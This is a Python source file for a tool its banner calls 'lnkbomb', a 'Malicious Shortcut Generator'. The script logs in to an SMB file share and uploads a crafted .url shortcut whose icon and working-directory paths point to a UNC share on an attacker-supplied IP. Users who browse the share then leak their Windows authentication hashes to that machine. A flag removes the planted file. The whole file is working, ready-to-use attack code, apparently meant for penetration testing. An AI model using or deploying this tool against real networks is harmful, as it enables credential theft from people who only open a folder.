import os
import sys
import argparse
import textwrap
import string
import random
from smb.SMBConnection import SMBConnection
import subprocess
from colorama import Fore, Style, init


def definitions():
    global info, close, success, fail, warn
    info, fail, close, success, warn = Fore.YELLOW + Style.BRIGHT, Fore.RED + \
        Style.BRIGHT, Style.RESET_ALL, Fore.GREEN + \
        Style.BRIGHT, Fore.LIGHTMAGENTA_EX + Style.BRIGHT


def banner():
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "")
    print('\n')
    print("██╗     ███╗   ██╗██╗  ██╗██████╗  ██████╗ ███╗   ███╗██████╗")
    print("██║     ████╗  ██║██║ ██╔╝██╔══██╗██╔═══██╗████╗ ████║██╔══██╗")
    print("██║     ██╔██╗ ██║█████╔╝ ██████╔╝██║   ██║██╔████╔██║██████╔╝")
    print("██║     ██║╚██╗██║██╔═██╗ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗")
    print("███████╗██║ ╚████║██║  ██╗██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝")
    print("╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝  v2.0\n")
    print("                 Malicious Shortcut Generator               ")
    print("                 Another project by The Mayor               ")
    print("                    https://themayor.tech                 \n" + Style.RESET_ALL)


def options():
    global args, port
    opt_parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter, epilog=textwrap.dedent(
        '''Example: 
        See https://github.com/dievus/lnkbomb for full details on using this tool.
'''))

    # Add required arguments
    operating_systems = opt_parser.add_mutually_exclusive_group()
    operating_systems.add_argument(
        '-w', '--windows', help='Select for Windows-specific target operating systems. [REQUIRED]', action='store_true')
    operating_systems.add_argument(
        '-l', '--linux', help='Select for Linux-specific target operating systems. [REQUIRED]', action='store_true')
    required = opt_parser.add_argument_group('Required Arguments')
    required.add_argument(
        '-t', '--target', help='Sets the target file share.', nargs='?', required=True)
    required.add_argument(
        '-a', '--attacker', help='Sets the attack machine IP.', nargs='?', required=True)
    required.add_argument(
        '-s', '--share', help='Name of share to authenticate to.', nargs='?', required=True)

    # Add optional arguments
    optional = opt_parser.add_argument_group('Optional Arguments')
    optional.add_argument('-u', '--username',
                          help='Username to log in to share with.', nargs='?')
    optional.add_argument('-p', '--password',
                          help='Password to log in to share with.', nargs='?')
    optional.add_argument(
        '-r', '--recover', help='Removes the malicious payload from the share.', nargs='?')
    # optional.add_argument(
    #     '-d', '--domain', help='Specify a domain if necessary.', nargs='?')
    optional.add_argument(
        '-n', '--netbios', help='Specifies netbios name (required for Windows).', nargs='?')

    args = opt_parser.parse_args()
    if args.windows:
        port = 139
    elif args.linux:
        port = 445
    if len(sys.argv) == 1:
        opt_parser.print_help()
        opt_parser.exit()


def main(netbios, port, file_name, directory):
    try:
        if args.target is not None and args.recover is None:
            client = ''.join(random.choice(string.ascii_lowercase)
                             for i in range(10))
            conn = SMBConnection(f'{args.username}', f'{args.password}', str(
                client), netbios, use_ntlm_v2=True)
            output = conn.connect(f'{args.target}', port)
            with open(f'{file_name}.url', 'w', newline='\r\n') as payload_file:
                payload_file.write(
                    f"[InternetShortcut]\nURL={args.attacker}\nWorkingDirectory=\\\\{args.attacker}\{directory}\nIconFile=\\\\{args.attacker}\{directory}.icon\nIconIndex=1")
                payload_file.close()
                with open(f'{file_name}.url', 'rb') as file_obj:
                    conn.storeFile(f'{args.share}',
                                   f'{file_name}.url', file_obj)
                    print(
                        success + f'[success] Malicious shortcut named {file_name}.url created in the {args.target} file share.\r\n' + close)
            conn.close()
            os.remove(f"{file_name}.url")
    except FileNotFoundError:
        print(warn + "[warn] Recovery file not found. Try again." + close)
        os.remove(f"{file_name}.url")
        quit()
    except ConnectionRefusedError:
        print(warn + "[warn] The remote share is unavailable." + close)
        quit()
    except KeyboardInterrupt:
        print(
            warn + "[warn] You either fat fingered this or something else. Either way, goodbye!" + close)
        os.remove(f"{file_name}.url")
        quit()
    except Exception as e:
        print(
            warn + '[warn] Please report the issue identified in the Github Issues section for review and remedy.' + close)


def recovery(netbios,port):
    try:
        if args.recover is not None:
            client = subprocess.Popen(
                ['hostname'], stdout=subprocess.PIPE).communicate()[0].strip()
            conn = SMBConnection(f'{args.username}', f'{args.password}', str(
                client), netbios, use_ntlm_v2=True)
            conn.connect(f'{args.target}', port)
            recover_file = f'{args.recover}'
            conn.deleteFiles(f'{args.share}', recover_file)
            print(
                success + '[success] Malicious shortcut file should be removed.\n' + close)
            conn.close()
    except FileNotFoundError:
        print(warn + "[warn] Recovery file not found. Try again." + close)
        quit()
    except ConnectionRefusedError:
        print(warn + "[warn] The remote share is unavailable." + close)
        quit()
    except KeyboardInterrupt:
        print(
            warn + "[warn] You either fat fingered this or something else. Either way, goodbye!" + close)
        quit()
    except Exception as e:
        print(
            warn + '[warn] The file may already be deleted or could not be found.\n' + close)
        pass


if __name__ == "__main__":
    try:
        init()
        definitions()
        banner()
        options()
        # if args.domain is not None:
        #     domain = args.domain
        # elif args.domain is None:
        #     domain = ''.join(random.choice(string.ascii_lowercase)
        #                      for i in range(10))
        if args.netbios is None:
            netbios = ''.join(random.choice(string.ascii_lowercase)
                              for i in range(10))
        elif args.netbios is not None:
            netbios = args.netbios
        file_name = ''.join(random.choice(string.ascii_lowercase)
                            for i in range(10))
        directory = ''.join(random.choice(string.ascii_lowercase)
                            for i in range(10))
        if args.username is None:
            args.username = ''.join(random.choice(string.ascii_lowercase)
                                    for i in range(10))

        main(netbios, port, file_name, directory)
        recovery(netbios, port)
    except KeyboardInterrupt:
        print(
            warn + "[warn] You either fat fingered this or something else. Either way, goodbye!" + close)
    except NameError:
        print(warn + "[warn] Linux and Windows use different SMB call ports.\n[warn] You must specify an operating system type.\n" + close)
